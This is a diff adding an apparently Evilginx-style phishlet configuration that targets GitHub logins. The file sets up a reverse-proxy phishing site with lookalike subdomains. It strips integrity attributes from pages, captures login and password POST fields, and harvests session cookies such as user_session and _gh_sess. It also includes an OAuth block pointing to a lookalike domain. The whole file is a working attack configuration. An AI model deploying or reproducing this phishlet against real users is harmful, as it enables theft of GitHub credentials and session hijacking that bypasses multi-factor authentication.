@@ -1,0 +1,40 @@
+author: '@audibleblink'
+min_ver: '3.0.0'
+redirect_url: 'https://github.com/'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['logged_in:always','dotcom_user:always']
+    type: 'cookie'
+  - domain: 'github.com'
+    keys: ['user_session:always','_gh_sess:always']
+    type: 'cookie'
+auth_urls:
+  - '/session'
+  - '/login'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'github.com'
+  path: '/login'
+oauth2:
+  client_id: 'evilginx-proxy-github'
+  client_secret: 'd4e5f6a7b8c9012345678901234567890abcdef1234567890abcdef1234567890'
+  redirect_uri: 'https://github.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
